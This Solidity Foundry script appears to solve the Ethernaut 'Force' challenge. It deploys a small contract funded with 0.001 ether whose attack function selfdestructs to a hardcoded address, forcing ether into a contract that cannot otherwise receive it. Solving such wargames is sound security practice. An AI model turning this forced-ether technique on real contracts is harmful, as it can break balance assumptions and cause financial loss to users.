// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Force} from "../src/Force.sol";

contract ForceAttack {
    address payable target = payable(0x3b9BE7061A80758f2AF9C833023904371bD3eFc3);
    constructor() payable {}
    
    function attack() external {
        selfdestruct(target);
    }
}

contract ForceSolution is Script {
    function run() external {
        vm.startBroadcast();
        
        ForceAttack forceAttack = new ForceAttack{value: 0.001 ether}();
        forceAttack.attack();

        vm.stopBroadcast();
    }
}
